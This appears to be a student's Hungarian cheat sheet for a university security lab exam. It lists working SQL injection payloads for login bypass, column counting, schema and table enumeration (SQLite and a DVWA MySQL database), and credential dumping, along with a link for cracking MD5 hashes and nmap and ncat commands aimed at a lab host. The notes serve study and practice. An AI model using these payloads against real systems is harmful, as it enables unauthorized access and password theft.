# SQL
https://www.inf.u-szeged.hu/~pengoe/sqli1.html

ctrl + u -> az oldal forráskódja

### Bejelentkezés (zh-n jelszó kitalálás?):
- SQLite
    - ' OR 1=1;--
- MySQL? (vagy más?)
    - ' OR '1'='1 

### Kideríteni hogy hány tábla van az adatbázidban
- SQLite
    - ' UNION SELECT 1,1,1,1; --
- többi

### Kideríteni milyen táblák vannak az adatbázidban (sqlite information_schema-ra kell rákeresni, ha nem jut eszünkbe)
- SQLite
    - ' UNION SELECT SQL,1,1,1 FROM SQLITE_SCHEMA; --
- többi
    -  ' UNION SELECT table_name, 1 FROM information_schema.tables WHERE table_schema='dvwa';#

### Ha megvannak a táblák meg kell nézni a teratlmukat
- SQLite
    - ' UNION SELECT NAME,KEY,1,1 FROM DATAUSRBB; --

### Innen az md5-öt decryptelni kell
- https://md5decrypt.net/en/
- Már csak be kell jelentkezni a jó jelszóval és kész

# C
chmod a+x ABCDEFG.prog
./ABCDEFG.prog


# HTML átírogatás


# nmap
nmap 10.6.12.105 -p 30000-

ncat 10.6.12.105 kapott_ipcím
